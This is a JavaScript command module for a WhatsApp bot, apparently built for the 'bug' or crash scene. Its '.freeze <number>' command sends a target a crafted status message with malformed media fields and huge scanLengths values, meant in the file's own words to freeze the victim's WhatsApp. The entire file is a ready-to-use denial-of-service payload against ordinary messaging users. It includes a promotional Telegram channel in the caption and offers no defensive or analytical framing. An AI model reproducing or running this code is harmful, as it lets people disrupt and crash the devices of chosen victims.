// freeze.js — command .freeze <nomor>
// tags  : tools
// usage : .freeze 628xxxxxxxx
// effect: kirim null-length status ke target → freeze WA mereka

import { generateWAMessageFromContent } from '@whiskeysockets/baileys'

const sleep = ms => new Promise(r => setTimeout(r, ms))

const LxP = {
  imageMessage: {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
    fileLength: 388944,
    height: 1600,
    width: 1200,
    mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
    fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
    directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1776937541",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFL/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
    contextInfo: {
      pairedMediaType: "NOT_PAIRED_MEDIA",
      isQuestion: true,
      isGroupStatus: true
    },
    caption: " 丫ЦКɪПΛ - t.me/FunctionBug ",
    scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
    scanLengths: [
      2899999999999999077,
      1799999999999998555,
      7699999999999999148,
      1069999999999999164
    ],
    midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
  }
}

async function NullLenght(WaSocket, target, mention = false) {
  const msg = generateWAMessageFromContent(target, LxP, {})

  await WaSocket.relayMessage('status@broadcast', msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: 'meta',
        attrs: {},
        content: [
          {
            tag: 'mentioned_users',
            attrs: {},
            content: [
              {
                tag: 'to',
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  })

  if (mention) {
    await WaSocket.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: 'meta',
            attrs: { is_status_mention: 'false' },
            content: undefined
          }
        ]
      }
    )
  }
}

let handler = async (m, { conn, args }) => {

  // ── validasi argumen ─────────────────────────────────────────────────────
  const nomor = args[0]?.replace(/[^0-9]/g, '')

  if (!nomor) {
    return conn.sendMessage(m.chat, {
      text: '❌ Format salah.\nContoh: .freeze 628xxxxxxxx'
    }, { quoted: m })
  }

  const target = nomor.includes('@s.whatsapp.net') ? nomor : `${nomor}@s.whatsapp.net`

  await conn.sendMessage(m.chat, {
    text: `🧊 Mengirim freeze ke *${nomor}*...`
  }, { quoted: m })

  // ── kirim NullLenght ─────────────────────────────────────────────────────
  try {
    await NullLenght(conn, target, true)
    await conn.sendMessage(m.chat, {
      text: `✅ Freeze terkirim ke *${nomor}*.`
    }, { quoted: m })
  } catch (e) {
    await conn.sendMessage(m.chat, {
      text: `❌ Gagal: ${e?.message || e}`
    }, { quoted: m })
  }
}

handler.help    = ['freeze <nomor>']
handler.tags    = ['tools']
handler.command = /^freeze$/i

export default handler